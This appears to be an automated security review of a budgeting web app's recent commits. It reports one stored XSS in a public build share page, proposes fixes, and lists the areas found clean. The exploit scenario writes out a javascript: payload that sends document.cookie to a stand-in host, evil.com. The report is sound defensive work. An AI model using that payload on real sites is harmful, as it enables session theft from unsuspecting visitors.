# Security Review — 2026-06-15

**Project:** TRE Forged Budget OS (Forgenta)
**Repository:** treforged/getforgenta
**Reviewer:** Automated bi-daily security agent
**Review window:** 2026-06-13 → 2026-06-15

---

## Commits Reviewed

| Commit | Description |
|--------|-------------|
| `512f7b2` | [fix]: cashWarning fires only when shortfall rounds up to at least $1 |
| `503f23a` | [fix]: suppress false cashWarning when safeToPayTotal equals minimums due |
| `bb0a9a1` | [forecast]: fix false cash-below-floor milestones after CC debt free |
| `ff96805` | [docs]: update Forecast and Debt Payoff in-app guides |
| `0da1a27` | [forecast]: fix p3RevBal interest drift with CC engine sync |
| `2b05ae5` | [forecast]: fix Prime Visa popup balance and CC badge surplus visibility |
| `1cec340` | [forecast]: fix surplus routing and popup balance mismatch |
| `32efb06` | [forecast]: align surplus redirect and balance display with CC engine |
| `0536a14` | [debt/forecast]: unify simulation via shared CardProjectionContext |
| `0cddc20` | [reviewer]: cut CC payments to maintain cash floor, seed lump sum payments |
| `6f47043` | [reviewer]: realistic paycheck top-up to maintain cash floor |
| `a0d4045` | [debt]: fix CC minimum double-deduction in dashboard recommendations |
| `c823700` | [reviewer]: enforce cash floor on every reviewer session reset |
| `279a024` | [demo]: add C5 Corvette car build and RAV4 auto loan to demo profile |
| `671f6cc` | [security]: harden image upload against viruses, polyglots, and trackers |
| `d5cb31a` | [security]: apply profanity/NSFW content filter app-wide |
| `ae0a83b` | [builds]: increase auto-collapse delay to 400ms |
| `3c0d4b3` | [builds]: delay auto-collapse of previous phase by 100ms |
| `091ee16` | [builds]: 400ms drag-hover expand, auto-collapse on phase change, cleanup |
| `e46c357` | [builds]: restore instant phase expand on drag-enter (no delay) |
| `2a0cde7` | [builds]: lift expanded state, remove hover delay, auto-close phases |
| `f5d2891` | [builds]: fix delete-after-edit, cursor-based above/below drop |
| `dcda2ef` | [builds]: eye swap, smoother drag, auto-scroll, phase expand, bottom drop zone |
| `2b0f719` | [forecast]: fix assumptions not loading on hard page reload |
| `058b061` | [forecast]: split non-cash transfers into separate popup section |
| `dd1aa47` | [forecast]: show per-account names and precise balances in popup |
| `536d875` | [forecast/debt]: fix per-card payments zeroing out after live balance exhausted |
| `4745c73` | [forecast]: fix cycling card blank payments and false floor-breach milestones |
| `d5a5bcc` | [sim]: fix Prime Visa showing $0 payments after revolving debt clears |
| `c465b75` | [security]: add 2026-06-13 bi-daily security review report |

**Files reviewed (security-relevant):**
- `src/lib/build-photos.ts` — new image upload hardening
- `src/lib/content-filter.ts` — new content/URL filter module
- `src/components/builds/PhaseBlock.tsx` — build item editor with URL validation
- `src/pages/BuildShare.tsx` — public build share page
- `src/pages/AiAdvisor.tsx` — AI advisor frontend
- `src/contexts/AuthContext.tsx` — auth state and reviewer reset logic
- `src/hooks/useSupabaseData.ts` — `usePublicBuild` hook
- `supabase/functions/ai-advisor/index.ts` — AI edge function
- `supabase/functions/reddit-scout/index.ts` — Reddit digest edge function
- `supabase/functions/delete-account/index.ts` — account deletion edge function
- `supabase/functions/plaid-exchange-token/index.ts` — Plaid token exchange
- `supabase/functions/_shared/cors.ts` — CORS allowlist
- `supabase/migrations/20260612_car_builds.sql` — new car_builds schema
- `supabase/migrations/20260612_payment_plans.sql` — new payment_plans schema

---

## Findings Table

| # | File | Line | Severity | Category | Confidence |
|---|------|------|----------|----------|------------|
| F-01 | `src/pages/BuildShare.tsx` | 295 | **HIGH** | Stored XSS | 87% |

---

## Detailed Findings

---

### F-01 · HIGH · Stored XSS via unsanitized `href` on public build share page

**File:** `src/pages/BuildShare.tsx:295`
**Category:** Cross-Site Scripting (Stored)
**Confidence:** 87%

#### Description

`BuildShare.tsx` renders item links directly from database rows with no URL validation:

```tsx
// src/pages/BuildShare.tsx:294-303
{item.link && (
  <a
    href={item.link}          // ← raw DB value, no isSafeUrl() call
    target="_blank"
    rel="noopener noreferrer"
    onClick={e => e.stopPropagation()}
    ...
  >
    <span className="print:hidden">VIEW LISTING</span>
  </a>
)}
```

The edit path in `PhaseBlock.tsx` applies `isSafeUrl()` (which rejects non-`http(s)://` schemes) **as a client-side guard only** (line 124). No equivalent check exists server-side: the `car_build_items` table RLS policy only validates row ownership, not column content:

```sql
-- supabase/migrations/20260612_car_builds.sql:60-64
create policy "users manage own build items"
  on public.car_build_items for all
  using (auth.uid() = user_id)
  with check (auth.uid() = user_id);
```

#### Exploit Scenario

1. Attacker registers a Forgenta account.
2. Attacker calls the Supabase REST API directly (with their valid JWT, bypassing the client-side form) and inserts a build item with `link = "javascript:document.location='https://evil.com/?c='+document.cookie"`.
3. Attacker enables share on their build and distributes the share URL.
4. Any unauthenticated visitor who loads `BuildShare` and clicks "VIEW LISTING" executes the attacker's JavaScript in the getforgenta.com origin.
5. From there the attacker can steal session cookies (if `HttpOnly` is not set on auth cookies), exfiltrate page content, or redirect the user.

React does not sanitize `javascript:` URIs in `href` attributes in production builds (it emits a console warning in development only). `rel="noopener noreferrer"` mitigates `window.opener` hijacking for `target="_blank"` but does not prevent `javascript:` URI execution — which runs in the **current** tab's context.

#### Fix Recommendation

Call `isSafeUrl()` in `BuildShare.tsx` before rendering the `href`, and fall back to not rendering the anchor if the check fails:

```tsx
// src/pages/BuildShare.tsx — replace the item.link anchor block
import { isSafeUrl } from '@/lib/content-filter';

{item.link && isSafeUrl(item.link).safe && (
  <a
    href={item.link}
    target="_blank"
    rel="noopener noreferrer"
    ...
  >
```

Additionally, add a database-level constraint to enforce the schema at write time, removing the dependence on client-side enforcement:

```sql
alter table public.car_build_items
  add constraint link_must_be_http
    check (link is null or link ~ '^https?://');
```

---

## Clean Areas

The following security-sensitive areas were reviewed and found clean:

| Area | Assessment |
|------|------------|
| `build-photos.ts` — image upload hardening | Magic-byte validation + canvas re-encode strips all EXIF/metadata/polyglot payloads. Solid implementation. |
| `ai-advisor` edge function | JWT auth → premium check → AI consent → per-user quota all enforced server-side via service role. Clean. |
| `reddit-scout` edge function | `x-webhook-secret` auth adequate for admin-only function. Prompt includes `[BEGIN/END REDDIT POST]` sandboxing comment. Output reviewed by admin before use — limits prompt-injection blast radius. |
| `delete-account` edge function | JWT auth + rate limit + Plaid cleanup + Stripe cancellation + ordered row deletion + auth user removal. No auth bypass found. |
| `plaid-exchange-token` edge function | JWT verified before any Plaid API call. |
| `_shared/cors.ts` | Explicit origin allowlist; unknown origins receive production origin (browsers reject). No wildcard. |
| `content-filter.ts` | `isSafeUrl()` correctly rejects non-http(s) schemes including `javascript:` and `data:`. |
| `car_builds` migration | RLS enabled on all three tables (`car_builds`, `car_build_phases`, `car_build_items`). Owner-only policies with both `USING` and `WITH CHECK`. Clean. |
| `payment_plans` migration | RLS enabled. Single owner-only policy with both `USING` and `WITH CHECK`. Clean. |
| `AuthContext.tsx` reviewer reset | Reset logic scoped to `reviewer@getforgenta.com` only; all DB mutations include `.eq('user_id', userId)` which RLS enforces. |

---

## Summary

**Status: ACTION REQUIRED — 1 finding**

| Priority | Action |
|----------|--------|
| **P1 — Fix before next deploy** | `BuildShare.tsx`: add `isSafeUrl()` guard around `href={item.link}` to prevent stored XSS on the public share page. |
| **P2 — Harden the data layer** | Add a `CHECK (link ~ '^https?://')` constraint to `car_build_items.link` so the database rejects non-HTTP URLs regardless of which client writes to it. |

The image upload hardening (`build-photos.ts`) landed cleanly and is a meaningful security improvement. The content filter module is well-designed but its URL enforcement needs to extend to the read path on `BuildShare.tsx`.
